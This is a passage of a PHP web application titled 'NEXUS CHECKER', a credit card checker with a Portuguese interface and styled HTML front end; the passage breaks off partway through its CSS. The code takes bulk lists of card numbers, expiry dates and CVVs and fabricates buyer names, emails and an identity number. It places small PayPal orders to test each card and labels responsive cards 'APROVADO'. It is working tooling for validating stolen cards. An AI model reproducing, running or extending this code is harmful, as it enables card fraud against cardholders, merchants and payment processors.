<?php
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 0);
ignore_user_abort(true);
set_time_limit(0);

require_once __DIR__ . '/../../../bin/bin.php';


define('MAX_EXECUTION_TIME', 240);
define('COOKIE_PATH', sys_get_temp_dir() . '/pp_cookies_' . session_id() . '_');


function getStr($string, $start, $end) {
    $str = explode($start, $string);
    if (isset($str[1])) {
        $str = explode($end, $str[1]);
        return $str[0];
    }
    return '';
}

function deletarCookies($suffix = '') {
    $cookieFile = COOKIE_PATH . $suffix . '.txt';
    if (file_exists($cookieFile)) {
        unlink($cookieFile);
    }
}

function gerarNome() {
    $nomes      = ['Christo', 'Ryan', 'Ethan', 'John', 'Zoey', 'Sarah', 'Pedro', 'Lucas', 'Alex', 'Ana', 'Henrique', 'Gabriela', 'Ashlley', 'Kleber'];
    $sobrenomes = ['Walker', 'Thompson', 'Anderson', 'Johnson', 'Soares', 'Souza', 'Pereira', 'Simpson', 'Camargo', 'Ribeiro', 'Silva'];
    return $nomes[array_rand($nomes)] . ' ' . $sobrenomes[array_rand($sobrenomes)];
}

function gerarEmail() {
    return "oto" . rand(10, 100000) . "@gmail.com";
}

function gerarUserAgent() {
    $winVer  = rand(6, 10);
    $webkit  = rand(500, 600);
    $chrome1 = rand(100, 120);
    $chrome2 = rand(4000, 5000);
    $chrome3 = rand(100, 300);
    $safari  = rand(500, 600);
    return "Mozilla/5.0 (Windows NT {$winVer}.0; Win64; x64) AppleWebKit/{$webkit}.0 (KHTML, like Gecko) Chrome/{$chrome1}.0.{$chrome2}.{$chrome3} Safari/{$safari}.0";
}

function detectCardType($cc) {
    $digito = substr($cc, 0, 1);
    if ($digito == '4') return 'VISA';
    if ($digito == '5' || $digito == '2') return 'MASTER_CARD';
    if ($digito == '6') return 'DISCOVER';
    if ($digito == '3') return 'AMEX';
    return 'UNKNOWN';
}

function formatarCartao($linha) {
    $linha = trim($linha);
    if (empty($linha)) return false;
    $linha = str_replace(" ", "|", $linha);
    $linha = str_replace("%20", "|", $linha);
    $linha = preg_replace('/[ -]+/', '-', $linha);
    $linha = str_replace("/", "|", $linha);
    $separar = explode("|", $linha);

    if (count($separar) >= 4) {
        $cc  = $separar[0];
        $mes = $separar[1];
        $ano = $separar[2];
        $cvv = $separar[3];

        if (strlen($ano) == 2) $ano = "20" . $ano;
        if (strlen($mes) == 1) $mes = "0" . $mes;

        if (!preg_match('/^\d{13,19}$/', $cc))   return false;
        if (!preg_match('/^\d{2}$/', $mes))       return false;
        if (!preg_match('/^\d{4}$/', $ano))       return false;
        if (!preg_match('/^\d{3,4}$/', $cvv))     return false;

        return "$cc|$mes|$ano|$cvv";
    }
    return false;
}

function formatarResultado($status, $cc, $mes, $ano, $cvv, $binInfo, $motivo) {
    $binTag = '[' . formatarBinStr($binInfo) . ']';

    if ($status === 'APROVADO') {
        return "✅ APROVADO » {$cc}|{$mes}|{$ano}|{$cvv} » {$binTag} » by @OtoNexusCloud";
    } else {
        return "❌ REPROVADO » {$cc}|{$mes}|{$ano}|{$cvv} » {$binTag} » @OtoNexusCloud";
    }
}


if (!isset($_SESSION['processor'])) {
    $_SESSION['processor'] = [
        'fila'            => [],
        'processados'     => 0,
        'aprovadas'       => 0,
        'reprovadas'      => 0,
        'total'           => 0,
        'status'          => 'idle',
        'resultados'      => [],
        'aprovadas_list'  => [],
        'reprovadas_list' => [],
        'logs'            => ['⚡ Sistema pronto para operar'],
        'inicio'          => null,
        'atual'           => null,
        'ultimo_id'       => 0,
    ];
}

// ============================================================
// API ENDPOINTS
// ============================================================
$action = $_GET['action'] ?? $_POST['action'] ?? '';

// ---------- INICIAR PROCESSAMENTO ----------
if ($action === 'iniciar_processamento' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');

    $lista_raw = $_POST['lista'] ?? '';
    $arquivo   = $_FILES['arquivo'] ?? null;
    $cartoes   = [];

    if (!empty($lista_raw)) {
        foreach (explode("\n", $lista_raw) as $linha) {
            $cartao = formatarCartao($linha);
            if ($cartao) $cartoes[] = $cartao;
        }
    }

    if ($arquivo && $arquivo['error'] === UPLOAD_ERR_OK) {
        foreach (explode("\n", file_get_contents($arquivo['tmp_name'])) as $linha) {
            $cartao = formatarCartao($linha);
            if ($cartao) $cartoes[] = $cartao;
        }
    }

    $cartoes = array_unique($cartoes);

    if (empty($cartoes)) {
        echo json_encode(['success' => false, 'error' => 'Nenhum cartão válido encontrado']);
        exit;
    }

    $_SESSION['processor'] = [
        'fila'            => $cartoes,
        'processados'     => 0,
        'aprovadas'       => 0,
        'reprovadas'      => 0,
        'total'           => count($cartoes),
        'status'          => 'processing',
        'resultados'      => [],
        'aprovadas_list'  => [],
        'reprovadas_list' => [],
        'logs'            => ['⚡ Processamento iniciado — ' . count($cartoes) . ' cartões na fila'],
        'inicio'          => time(),
        'atual'           => null,
        'ultimo_id'       => 0,
    ];

    echo json_encode(['success' => true, 'total' => count($cartoes)]);
    exit;
}

// ---------- PROCESSAR PRÓXIMO ----------
if ($action === 'processar_proximo' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');

    if ($_SESSION['processor']['status'] !== 'processing') {
        echo json_encode(['success' => false, 'error' => 'Processamento não está ativo']);
        exit;
    }

    if (empty($_SESSION['processor']['fila'])) {
        $_SESSION['processor']['status'] = 'completed';
        echo json_encode(['success' => false, 'error' => 'Fila vazia', 'completed' => true]);
        exit;
    }

    $cartao = array_shift($_SESSION['processor']['fila']);
    $_SESSION['processor']['ultimo_id']++;
    $id = $_SESSION['processor']['ultimo_id'];

    $partes        = explode('|', $cartao);
    $cc            = $partes[0];
    $mes           = $partes[1];
    $ano           = $partes[2];
    $cvv           = $partes[3];
    $card_type     = detectCardType($cc);
    $nome_completo = gerarNome();
    $primeiro_nome = explode(" ", $nome_completo)[0];
    $email         = gerarEmail();
    $user_agent    = gerarUserAgent();
    $masked        = substr($cc, 0, 6) . '******' . substr($cc, -4);

    $log         = "▶ [#{$id}] Iniciando: {$masked}|{$mes}|{$ano}|{$cvv}\n";
    $display     = '';
    $is_approved = false;
    $motivo      = '';

    // ── CONSULTA BIN via bin.php (require_once no topo deste arquivo) ──
    $binInfo = getBinInfo($cc);
    $binStr  = formatarBinStr($binInfo);
    $log    .= "🔍 [{$id}] BIN: {$binStr}\n";

    // ── REQ 1: Token ──
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/smart/buttons?style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&fundingSource=paypal&allowBillingPayments=true&applePaySupport=false&buttonSessionID=uid_492a535db5_mty6mjg6nde&customerId=&clientID=AXvC3Esmc176nITd8oIUiVWMG0c6n-VJnJPcIaVSE-t1I-Qnulxu4OHCwDN80h_kF-NcZnK3Ai0LRxHR&clientMetadataID=uid_1a960bc26e_mty6mjg6nde&commit=true&components.0=buttons&components.1=funding-eligibility&currency=USD&debug=false&disableSetCookie=true&enableFunding.0=paylater&enableFunding.1=venmo&env=production&experiment.enableVenmo=false&experiment.venmoVaultWithoutPurchase=false&experiment.venmoWebEnabled=false&experiment.isPaypalRebrandEnabled=false&experiment.defaultBlueButtonColor=gold&experiment.venmoEnableWebOnNonNativeBrowser=false&flow=purchase&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpmYWxzZSwicHJvZHVjdHMiOnsicGF5SW4zIjp7ImVsaWdpYmxlIjpmYWxzZSwidmFyaWFudCI6bnVsbH0sInBheUluNCI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9fX0sImNhcmQiOnsiZWxpZ2libGUiOnRydWUsImJyYW5kZWQiOnRydWUsImluc3RhbGxtZW50cyI6ZmFsc2UsInZlbmRvcnMiOnsidmlzYSI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwibWFzdGVyY2FyZCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiYW1leCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiZGlzY292ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJoaXBlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjpmYWxzZX0sImVsbyI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwibWFlc3RybyI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiZGluZXJzIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJjdXAiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJjYl9uYXRpb25hbGUiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9fSwiZ3Vlc3RFbmFibGVkIjp0cnVlfSwidmVubW8iOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiaXRhdSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJjcmVkaXQiOnsiZWxpZ2libGUiOmZhbHNlfSwiYXBwbGVwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwic2VwYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpZGVhbCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJiYW5jb250YWN0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImdpcm9wYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwiZXBzIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNvZm9ydCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJteWJhbmsiOnsiZWxpZ2libGUiOmZhbHNlfSwicDI0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG9iYW5jYXJpbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtZXJjYWRvcGFnbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtdWx0aWLhuY10byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzYXRpc3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYWlkeSI6eyJlbGlnaWJsZSI6ZmFsc2V9fQ&intent=capture&locale.country=US&locale.lang=en&merchantID.0=KZTE6QC49FDL8&hasShippingCallback=false&platform=desktop&renderedButtons.0=paypal&sessionID=uid_1a960bc26e_mty6mjg6nde&sdkCorrelationID=prebuild&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVh2QzNFc21jMTc2bklUZDhvSVVpVldNRzBjNm4tVkpuSlBjSWFWU0UtdDFJLVFudWx4dTRPSEN3RE44MGhfa0YtTmNabkszQWkwTFJ4SFImY3VycmVuY3k9VVNEJmVuYWJsZS1mdW5kaW5nPXBheWxhdGVyLHZlbm1vJm1lcmNoYW50LWlkPUtaVEU2UUM0OUZETDgmY29tcG9uZW50cz1mdW5kaW5nLWVsaWdpYmlsaXR5LGJ1dHRvbnMiLCJhdHRycyI6eyJkYXRhLXNkay1pbnRlZ3JhdGlvbi1zb3VyY2UiOiJyZWFjdC1wYXlwYWwtanMiLCJkYXRhLXVpZCI6InVpZF9qaG5iZHZ0anFzZXF4bnZkdGxibHdlY2t5Y2VvcmIifX0&sdkVersion=5.0.474&storageID=uid_fd4b7e505d_mty6mjg2mde&supportedNativeBrowser=false&supportsPopups=true&vault=false');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_COOKIEJAR,  COOKIE_PATH . $id . '.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, COOKIE_PATH . $id . '.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['User-Agent: ' . $user_agent]);
    $res1  = curl_exec($ch);
    $http1 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $access_token = getStr($res1, 'facilitatorAccessToken":"', '"');

    if (!$access_token) {
        $motivo  = 'Falha no token';
        $display = formatarResultado('REPROVADO', $cc, $mes, $ano, $cvv, $binInfo, $motivo);
        $log    .= "✗ [{$id}] Token não obtido (HTTP {$http1})\n";
        deletarCookies($id);
        $_SESSION['processor']['processados']++;
        $_SESSION['processor']['reprovadas']++;
        $_SESSION['processor']['resultados'][]      = $display;
        $_SESSION['processor']['reprovadas_list'][] = $display;
        $_SESSION['processor']['logs'][]            = $log;
        echo json_encode([
            'success'     => true,
            'resultado'   => $display,
            'log'         => $log,
            'processados' => $_SESSION['processor']['processados'],
            'aprovadas'   => $_SESSION['processor']['aprovadas'],
            'reprovadas'  => $_SESSION['processor']['reprovadas'],
            'total'       => $_SESSION['processor']['total'],
            'completed'   => empty($_SESSION['processor']['fila']),
        ]);
        exit;
    }

    $log .= "✓ [{$id}] Token OK\n";

    // ── REQ 2: Order ──
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/v2/checkout/orders');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"purchase_units":[{"amount":{"value":"1.00","currency_code":"BRL"},"description":"Doação"}],"application_context":{"shipping_preference":"NO_SHIPPING"},"intent":"CAPTURE"}');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_COOKIEFILE, COOKIE_PATH . $id . '.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR,  COOKIE_PATH . $id . '.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'User-Agent: '          . $user_agent,
        'Content-Type: application/json',
        'Authorization: Bearer ' . $access_token,
    ]);
    $res2  = curl_exec($ch);
    $http2 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $order_id = getStr($res2, '"id":"', '"');

    if (!$order_id) {
        $motivo  = 'Falha na ordem';
        $display = formatarResultado('REPROVADO', $cc, $mes, $ano, $cvv, $binInfo, $motivo);
        $log    .= "✗ [{$id}] Order ID não obtido (HTTP {$http2})\n";
        deletarCookies($id);
        $_SESSION['processor']['processados']++;
        $_SESSION['processor']['reprovadas']++;
        $_SESSION['processor']['resultados'][]      = $display;
        $_SESSION['processor']['reprovadas_list'][] = $display;
        $_SESSION['processor']['logs'][]            = $log;
        echo json_encode([
            'success'     => true,
            'resultado'   => $display,
            'log'         => $log,
            'processados' => $_SESSION['processor']['processados'],
            'aprovadas'   => $_SESSION['processor']['aprovadas'],
            'reprovadas'  => $_SESSION['processor']['reprovadas'],
            'total'       => $_SESSION['processor']['total'],
            'completed'   => empty($_SESSION['processor']['fila']),
        ]);
        exit;
    }

    $log .= "✓ [{$id}] Order: {$order_id}\n";

    // ── REQ 3: Payment ──
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/graphql?fetch_credit_form_submit');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"query":"mutation payWithCard($token: String!, $card: CardInput!, $phoneNumber: String, $firstName: String, $lastName: String, $billingAddress: AddressInput, $email: String, $currencyConversionType: CheckoutCurrencyConversionType, $identityDocument: IdentityDocumentInput) { approveGuestPaymentWithCreditCard(token: $token, card: $card, phoneNumber: $phoneNumber, firstName: $firstName, lastName: $lastName, email: $email, billingAddress: $billingAddress, currencyConversionType: $currencyConversionType, identityDocument: $identityDocument) { flags { is3DSecureRequired } cart { intent cartId buyer { userId auth { accessToken } } returnUrl { href } } paymentContingencies { threeDomainSecure { status method redirectUrl { href } parameter } } } }","variables":{"token":"' . $order_id . '","card":{"cardNumber":"' . $cc . '","type":"' . $card_type . '","expirationDate":"' . $mes . '/' . $ano . '","postalCode":"01310000","securityCode":"' . $cvv . '","productClass":"CREDIT"},"phoneNumber":"11987654321","firstName":"' . $primeiro_nome . '","lastName":"DEV","billingAddress":{"givenName":"' . $primeiro_nome . '","familyName":"DEV","state":"SP","country":"BR","postalCode":"01310000","line1":"Avenida Paulista, 1000","line2":"Apto 123","city":"Sao Paulo"},"email":"' . $email . '","currencyConversionType":"VENDOR","identityDocument":{"value":"52998224725","type":"CPF"}}}');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 45);
    curl_setopt($ch, CURLOPT_COOKIEFILE, COOKIE_PATH . $id . '.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR,  COOKIE_PATH . $id . '.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'User-Agent: '                . $user_agent,
        'Content-Type: application/json',
        'Paypal-Client-Context: '     . $order_id,
        'Paypal-Client-Metadata-Id: ' . $order_id,
        'x-requested-with: XMLHttpRequest',
        'X-Country: BR',
        'X-App-Name: standardcardfields',
    ]);
    $res3  = curl_exec($ch);
    $http3 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // ── AVALIAR RESULTADO ──
    if (strpos($res3, 'is3DSecureRequired') !== false) {
        $motivo      = '3DS Required';
        $is_approved = true;
    } elseif (strpos($res3, 'INVALID_SECURITY_CODE') !== false) {
        $motivo      = 'CVV Inválido';
        $is_approved = true;
    } elseif (strpos($res3, 'INVALID_BILLING_ADDRESS') !== false) {
        $motivo      = 'Endereço Inválido';
        $is_approved = true;
    } elseif (strpos($res3, 'INVALID_EXPIRATION') !== false) {
        $motivo      = 'Data Inválida';
        $is_approved = true;
    } elseif (strpos($res3, 'RISK_DISALLOWED') !== false) {
        $motivo      = 'Risk Disallowed';
        $is_approved = true;
    } elseif (strpos($res3, 'ISSUER_DECLINE') !== false) {
        $motivo      = 'Recusado pelo Emissor';
        $is_approved = false;
    } else {
        $motivo      = getStr($res3, '"message":"', '"') ?: 'Recusado';
        $is_approved = false;
    }

    $display = formatarResultado($is_approved ? 'APROVADO' : 'REPROVADO', $cc, $mes, $ano, $cvv, $binInfo, $motivo);
    $log    .= ($is_approved ? "✓" : "✗") . " [{$id}] " . ($is_approved ? "APROVADO" : "REPROVADO") . " — {$motivo}\n";
    $log    .= "📡 [{$id}] HTTP: {$http1} | {$http2} | {$http3}\n";

    deletarCookies($id);

    $_SESSION['processor']['processados']++;
    $_SESSION['processor']['resultados'][] = $display;

    if ($is_approved) {
        $_SESSION['processor']['aprovadas']++;
        $_SESSION['processor']['aprovadas_list'][] = $display;
    } else {
        $_SESSION['processor']['reprovadas']++;
        $_SESSION['processor']['reprovadas_list'][] = $display;
    }

    $_SESSION['processor']['logs'][] = $log;

    $completed = empty($_SESSION['processor']['fila']);
    if ($completed) {
        $_SESSION['processor']['status'] = 'completed';
        $_SESSION['processor']['logs'][] = '⚡ Processamento finalizado!';
    }

    echo json_encode([
        'success'     => true,
        'resultado'   => $display,
        'log'         => $log,
        'processados' => $_SESSION['processor']['processados'],
        'aprovadas'   => $_SESSION['processor']['aprovadas'],
        'reprovadas'  => $_SESSION['processor']['reprovadas'],
        'total'       => $_SESSION['processor']['total'],
        'completed'   => $completed,
        'status'      => $_SESSION['processor']['status'],
    ]);
    exit;
}

// ---------- STATUS ----------
if ($action === 'get_status') {
    header('Content-Type: application/json');
    echo json_encode([
        'status'          => $_SESSION['processor']['status'],
        'processados'     => $_SESSION['processor']['processados'],
        'aprovadas'       => $_SESSION['processor']['aprovadas'],
        'reprovadas'      => $_SESSION['processor']['reprovadas'],
        'total'           => $_SESSION['processor']['total'],
        'resultados'      => $_SESSION['processor']['resultados'],
        'aprovadas_list'  => $_SESSION['processor']['aprovadas_list'],
        'reprovadas_list' => $_SESSION['processor']['reprovadas_list'],
        'logs'            => $_SESSION['processor']['logs'],
        'atual'           => $_SESSION['processor']['atual'],
    ]);
    exit;
}

// ---------- PAUSAR / RETOMAR / LIMPAR ----------
if ($action === 'pausar') {
    header('Content-Type: application/json');
    $_SESSION['processor']['status']  = 'paused';
    $_SESSION['processor']['logs'][]  = '⏸ Processamento pausado';
    echo json_encode(['success' => true]);
    exit;
}

if ($action === 'retomar') {
    header('Content-Type: application/json');
    $_SESSION['processor']['status']  = 'processing';
    $_SESSION['processor']['logs'][]  = '▶ Processamento retomado';
    echo json_encode(['success' => true]);
    exit;
}

if ($action === 'limpar') {
    header('Content-Type: application/json');
    $_SESSION['processor'] = [
        'fila'            => [],
        'processados'     => 0,
        'aprovadas'       => 0,
        'reprovadas'      => 0,
        'total'           => 0,
        'status'          => 'idle',
        'resultados'      => [],
        'aprovadas_list'  => [],
        'reprovadas_list' => [],
        'logs'            => ['🧹 Sessão reiniciada'],
        'inicio'          => null,
        'atual'           => null,
        'ultimo_id'       => 0,
    ];
    echo json_encode(['success' => true]);
    exit;
}
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>NEXUS CHECKER — PayPal Braintree</title>

<!-- Favicon SVG inline -->
<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='4' fill='%23050508'/%3E%3Crect x='1' y='1' width='30' height='30' rx='3' fill='none' stroke='%2300d4ff' stroke-width='1' opacity='.4'/%3E%3Cpath fill='none' stroke='%2300d4ff' stroke-width='1.8' stroke-linecap='round' d='M4 16h4l3-7 4 14 3-7 2 0 1-3 1 3h5'/%3E%3C/svg%3E">

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
<style>
/* ============================================================
   RESET & ROOT
   ============================================================ */
*, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }

:root {
  --bg:        #050508;
  --bg2:       #0a0a12;
  --bg3:       #0e0e1a;
  --panel:     rgba(10,10,20,0.85);
  --border:    rgba(0,210,255,0.15);
  --cyan:      #00d4ff;
  --cyan2:     #00fff7;
  --green:     #00ff88;
  --red:       #ff2d55;
  --amber:     #ffb300;
  --dim:       #3a4060;
  --text:      #c8d4e8;
  --muted:     #4a5578;
  --font-mono: 'Share Tech Mono', monospace;
  --font-ui:   'Rajdhani', sans-serif;
  --font-hud:  'Orbitron', sans-serif;
}

html { scrollbar-width: thin; scrollbar-color: var(--cyan) var(--bg2); }
body {
  background: var(--bg);
  color: var(--text);
  font-family: var(--font-ui);
  min-height: 100vh;
  overflow-x: hidden;
  position: relative;
}

/* scanline overlay */
body::before {
  content: '';
  position: fixed; inset: 0;
  background: repeating-linear-gradient(
    0deg, transparent, transparent 2px,
    rgba(0,0,0,0.12) 2px, rgba(0,0,0,0.12) 4px
  );
  pointer-events: none; z-index: 9999;
}

/* grid bg */
body::after {
  content: '';
  position: fixed; inset: 0;
  background-image:
    linear-gradient(rgba(0,212,255,0.025) 1px, transparent 1px),
    linear-gradient(90deg, rgba(0,212,255,0.025) 1px, transparent 1px);
  background-size: 40px 40px;
  pointer-events: none; z-index: 0;
}

/* ============================================================
   LAYOUT
   ============================================================ */
.wrap {
  position: relative; z-index: 1;
  max-width: 1640px;
  margin: 0 auto;
  padding: 20px 20px 40px;
}

/* ============================================================
   BACK BUTTON
   ============================================================ */
.back-btn {
  display: inline-flex; align-items: center; gap: 8px;
  background: transparent;
  border: 1px solid var(--cyan);
  color: var(--cyan);
  text-decoration: none;
  font-family: var(--font-mono);
  font-size: 12px;
  padding: 8px 18px;
  letter-spacing: 2px;
  text-transform: uppercase;
  clip-path: polygon(8px 0%, 100% 0%, calc(100% - 8px) 100%, 0% 100%);
  transition: background .2s, color .2s;
  position: fixed; top: 18px; left: 18px; z-index: 100;
}
.back-btn:hover { background: var(--cyan); color: var(--bg); }
.back-btn .arr { animation: slideL 1.4s ease-in-out infinite; display:inline-block; }
@keyframes slideL { 0%,100%{transform:translateX(0)} 50%{transform:translateX(-4px)} }

/* ============================================================
   HEADER
   ============================================================ */
.hdr {
  text-align: center;
  padding: 60px 0 36px;
  position: relative;
}
.hdr-logo {
  font-family: var(--font-hud);
  font-size: clamp(26px, 5vw, 48px);
  font-weight: 900;
  letter-spacing: 6px;
  text-transform: uppercase;
  color: var(--cyan);
  text-shadow: 0 0 20px var(--cyan), 0 0 60px rgba(0,212,255,0.3);
  animation: flicker 6s infinite;
}
@keyframes flicker {
  0%,95%,100%{opacity:1} 96%{opacity:.85} 97%{opacity:1} 98%{opacity:.9}
}
.hdr-sub {
  font-family: var(--font-mono);
  font-size: 12px;
  color: var(--muted);
  letter-spacing: 4px;
  margin-top: 8px;
  text-transform: uppercase;
}
.hdr-line {
  width: 300px; height: 1px;
  background: linear-gradient(90deg, transparent, var(--cyan), transparent);
  margin: 18px auto 0;
}

/* ============================================================
   PANELS
   ============================================================ */
.panel {
  background: var(--panel);
  border: 1px solid var(--border);
  border-radius: 4px;
  padding: 24px;
  position: relative;
  backdrop-filter: blur(8px);
}
.panel::before, .panel::after {
  content: ''; position: absolute;
  width: 12px; height: 12px;
  border-color: var(--cyan); border-style: solid;
}
.panel::before { top:-1px; left:-1px; border-width: 2px 0 0 2px; }
.panel::after  { bottom:-1px; right:-1px; border-width: 0 2px 2px 0; }

.panel-label {
  font-family: var(--font-mono);
  font-size: 10px; letter-spacing: 3px; text-transform: uppercase;
  color: var(--cyan); margin-bottom: 18px;
  display: flex; align-items: center; gap: 10px;
}
.panel-label::after {
  content: ''; flex: 1; height: 1px;
  background: linear-gradient(90deg, var(--border), transparent);
}

/* ============================================================
   INPUT AREA
   ============================================================ */
.input-grid {
  display: grid; grid-template-columns: 1fr 280px;
  gap: 16px; margin-bottom: 20px;
}
@media (max-width: 700px) { .input-grid { grid-template-columns: 1fr; } }

textarea {
  width: 100%; min-height: 130px;
  background: rgba(0,0,0,0.5);
  border: 1px solid var(--dim); border-radius: 2px;
  color: var(--cyan2); font-family: var(--font-mono);
  font-size: 13px; padding: 14px; resize: vertical;
  transition: border-color .2s; line-height: 1.8;
}
textarea:focus {
  outline: none; border-color: var(--cyan);
  box-shadow: 0 0 12px rgba(0,212,255,0.2);
}
textarea::placeholder { color: var(--muted); }

.file-zone {
  display: flex; flex-direction: column; align-items: center;
  justify-content: center;
  background: rgba(0,0,0,0.4); border: 1px dashed var(--dim);
  border-radius: 2px; padding: 20px; cursor: pointer;
  transition: border-color .2s; text-align: center;
  min-height: 130px; gap: 12px;
}
.file-zone:hover { border-color: var(--cyan); }
.file-zone svg { opacity: .4; }
.file-zone-label {
  font-family: var(--font-mono); font-size: 11px;
  color: var(--muted); letter-spacing: 1px;
}
.file-zone input { display:none; }
.file-zone.active { border-color: var(--green); }
.file-name { font-family: var(--font-mono); font-size: 11px; color: var(--green); word-break: break-all; }

/* ============================================================
   BUTTONS
   ============================================================ */
.btn-row { display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 24px; }
.btn {
  font-family: var(--font-hud); font-size: 13px; font-weight: 700;
  letter-spacing: 2px; text-transform: uppercase;
  padding: 12px 28px; border: 1px solid; background: transparent;
  cursor: pointer;
  clip-path: polygon(6px 0%, 100% 0%, calc(100% - 6px) 100%, 0% 100%);
  transition: all .2s; flex: 1 1 auto; min-width: 120px;
}
.btn:disabled { opacity:.3; cursor:not-allowed; }
.btn-start  { border-color: var(--cyan);  color: var(--cyan);  }
.btn-start:hover:not(:disabled)  { background: var(--cyan);  color: var(--bg); box-shadow: 0 0 20px var(--cyan); }
.btn-pause  { border-color: var(--amber); color: var(--amber); }
.btn-pause:hover:not(:disabled)  { background: var(--amber); color: var(--bg); box-shadow: 0 0 20px var(--amber); }
.btn-resume { border-color: var(--green); color: var(--green); }
.btn-resume:hover:not(:disabled) { background: var(--green); color: var(--bg); box-shadow: 0 0 20px var(--green); }
.btn-clear  { border-color: var(--red);   color: var(--red);   }
.btn-clear:hover:not(:disabled)  { background: var(--red);   color: var(--bg); box-shadow: 0 0 20px var(--red); }

.btn-sm {
  font-family: var(--font-mono); font-size: 11px; letter-spacing: 1px;
  padding: 8px 16px; border: 1px solid var(--dim);
  background: transparent; color: var(--muted); cursor: pointer;
  transition: all .2s;
  clip-path: polygon(4px 0%, 100% 0%, calc(100% - 4px) 100%, 0% 100%);
